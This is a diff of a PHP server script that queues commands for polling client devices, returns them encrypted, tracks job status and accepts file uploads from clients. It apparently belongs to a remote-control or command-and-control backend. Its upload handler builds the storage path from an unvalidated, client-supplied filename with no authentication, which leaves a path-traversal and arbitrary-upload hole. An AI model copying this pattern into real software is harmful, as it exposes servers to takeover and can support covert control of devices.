@@ -22,10 +22,11 @@ if (file_exists('config/db.php') and $_SERVER['REQUEST_METHOD'] === "GET") {
 
     // check request for download wallpaper and etc...
     if (isset($_FILES) and !empty($_FILES)) {
-        $break = explode("_", basename($_FILES["file"]["name"]));
+        $break = explode("@@@", basename($_FILES["file"]["name"]));
         $uid = $break[0];
         move_uploaded_file($_FILES["file"]["tmp_name"], "users/$uid/$break[1]");
-    }
+     
+     }
 
 
     // check request for newuser or update user
@@ -94,11 +95,15 @@ if (file_exists('config/db.php') and $_SERVER['REQUEST_METHOD'] === "GET") {
                 $cmd_uid = rand();
                 $data = $sql->fetch(PDO::FETCH_ASSOC);
                 // add up command event
+                if(!empty(trim($data['up']))){
+
                 $sql = $connection->prepare("INSERT INTO `command` (`cmd`, `uuid`,  `cmd_uid`) VALUES (?,?,?);");
                 $sql->bindValue(1, $data['up']);
                 $sql->bindValue(2, $uuid);
                 $sql->bindValue(3, $cmd_uid);
                 $sql->execute();
+            }
+
             }
         }
 
@@ -107,20 +112,36 @@ if (file_exists('config/db.php') and $_SERVER['REQUEST_METHOD'] === "GET") {
         $sql->bindValue(1, $uuid);
         $sql->execute();
         if ($sql->rowCount() >= 1) {
-            $data = $sql->fetch(PDO::FETCH_ASSOC);
+            $data = $sql->fetchAll(PDO::FETCH_ASSOC);
 
             echo encrypt_msg(json_encode($data));
-
-        } else {
-
-
-            echo encrypt_msg("wait");
             $sql = $connection->prepare("UPDATE `users` SET `status` = 1 WHERE uuid=?");
             $sql->bindValue(1, $uuid);
             $sql->execute();
 
 
+            // run when have fail command
+            $sql = $connection->prepare("UPDATE `users` SET `failjob` = 0 WHERE uuid=?");
+            $sql->bindValue(1, $uuid);
+            $sql->execute();
+        } else {
+
+
+            echo encrypt_msg("wait");
+            $sql = $connection->prepare("UPDATE `users` SET `status` = 1, `failjob` = 1 WHERE uuid=?");
+            $sql->bindValue(1, $uuid);
+            $sql->execute();
+
+
+
+
+
+
 
         }
+        #connection->prepare("UPDATE `users` SET `status` = 1 WHERE uuid=?");
+            // $sql->bindValue(1, $uuid);
+            // $sql->execute();
+
     }
 }
